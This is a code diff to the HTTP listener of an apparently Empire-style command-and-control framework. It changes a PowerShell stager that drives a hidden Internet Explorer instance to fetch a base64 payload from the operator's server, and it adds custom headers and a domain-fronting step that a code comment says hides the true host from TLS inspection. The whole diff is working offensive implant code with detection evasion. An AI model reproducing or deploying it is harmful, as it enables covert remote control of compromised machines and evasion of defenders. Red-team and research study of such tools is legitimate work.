@@ -183,6 +183,7 @@ class Listener:
             requestHeader = listenerOptions['RequestHeader']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
+            customHeaders = profile.split('|')[2:]
 
             if language.startswith('po'):
                 # PowerShell
@@ -239,10 +240,31 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                # add the RC4 packet to a header location
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
                 stager += "$ser='%s';$t='%s';" % (host, stage0)
-                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,'%s: %s');"  % (requestHeader, b64RoutingPacket)
+
+                # add the RC4 packet to a header location
+                stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
+
+                #Add custom headers if any
+                modifyHost = False
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        
+                        if headerKey.lower() == "host":
+                            modifyHost = True
+
+                        stager += "`r`n%s: %s" % (headerKey, headerValue)
+
+                stager += "\";"
+                #If host header defined, assume domain fronting is in use and add a call to the base URL first
+                #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                if modifyHost:
+                    stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
+                
+                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
                 stager += "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
@@ -417,6 +439,7 @@ class Listener:
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
                                 $Headers = "%s: $RoutingCookie"
+                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -457,12 +480,16 @@ class Listener:
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
 
+                                $Headers = ""
+                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $Headers.TrimStart("`r`n")
+                                
                                 try {
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
                                     $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
 
-                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Null)
+                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
                                     while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                 }
                                 catch [System.Net.WebException]{
